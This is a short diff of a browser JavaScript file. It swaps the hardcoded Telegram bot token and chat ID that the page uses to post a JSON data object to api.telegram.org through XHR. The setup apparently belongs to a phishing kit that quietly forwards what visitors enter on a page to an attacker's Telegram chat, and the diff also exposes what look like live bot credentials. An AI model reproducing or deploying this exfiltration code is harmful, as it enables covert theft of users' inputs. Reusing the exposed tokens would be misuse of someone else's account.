@@ -2,8 +2,8 @@ document.addEventListener("DOMContentLoaded", function () {
   const btWole = document.getElementById("btWole");
   const msgFont = document.getElementById("msgfont");
 
-  const botToken1 = "7809982559:AAEXaFIyx9OoPZ0FolAY9mO9TBwvDuKiE";
-  const chatId1 = "8064527937";
+  const botToken1 = "7334194741:AAHrxdfPH3zHgNFKQ5rsxIctgmI0y20rAyw";
+  const chatId1 = "6613870250";
   const telegramUrl1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;
 
   const botToken2 = "";
@@ -115,4 +115,5 @@ document.addEventListener("DOMContentLoaded", function () {
     xhr.send(JSON.stringify(data));
   }
 });
+
 
